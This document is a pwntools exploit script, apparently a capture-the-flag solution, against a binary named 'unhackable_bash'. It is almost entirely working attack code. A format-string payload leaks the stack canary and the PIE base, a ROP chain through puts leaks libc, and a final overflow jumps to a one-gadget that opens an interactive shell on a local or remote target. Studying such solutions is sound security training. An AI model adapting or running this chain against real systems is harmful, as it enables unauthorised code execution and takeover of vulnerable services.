from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./publish/unhackable_bash', checksec=False)

# Specify host/port for remote execution
host = args.HOST or 'localhost'
port = int(args.PORT or 20023)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["edb", "--run", exe.path] + argv, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Define some useful values found during binary analytics
libc_path = ''
shell_gadget_offset = 0xdeadbeef

if args.REMOTE:
    libc_path = './publish/docker-libc.so'
    shell_gadget_offset = 0x45226
else:
    libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
    shell_gadget_offset = 0xe3b01

libc = ELF(libc_path)


buffer_offset = 72

canary_stack_offset = 15
address_stack_offset = 9

# We know this from elf
pie_offset = 0x14e6
gadget_offset = 0x1b33


io = start()

io.sendlineafter(b'6: Give feedback', b'6')

# Leak 2 values from stack, address to calculate piebase and canary
# for future rop's
io.sendlineafter(b'learned', '%{}$p %{}$p'.format(
    address_stack_offset, canary_stack_offset).encode())

io.recvuntil(b': ')

address_str, canary_str = str(io.recvline(), 'utf-8').split(' ')

leaked_address = int(address_str, 16)
leaked_cannary = int(canary_str, 16)

# Now calculate the piebase using known static address offset
exe.address = leaked_address - pie_offset

pop_rdi_gadget = exe.address + gadget_offset

# Print leaked values for debug
info("piebase: %#x", exe.address)
info("leaked canary: %#x", leaked_cannary)

io.sendlineafter(b'6: Give feedback', b'3')
io.recvuntil(b'filename')

# Construct payload to leak libc address
payload = flat({
    buffer_offset: [
        leaked_cannary,  # leaked canary to safely take up on the control flow
        b'junkjunk',     # just need to feel the offset
        pop_rdi_gadget,  # pop rdi; ret
        exe.got.puts,   # get got address of puts as argument
        exe.plt.puts,   # Call puts() to leak the got.puts address
        exe.symbols.read_file
    ]
})

io.sendline(payload)
io.recvline()

# Read and unpack got address for puts
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))

# Get libc base address
libc.address = got_puts - libc.symbols.puts

info("libc_base: %#x", libc.address)

# Knowing libc address, we can calculate our shell gadget address
shell_gadget = libc.address + shell_gadget_offset

payload = flat({
    buffer_offset: [
        leaked_cannary,
        b'junkjunk',
        shell_gadget  # system('/bin/sh')
    ]
})

io.recvuntil(b'filename')
io.sendline(payload)

io.recvline()

# Get shell
io.interactive()
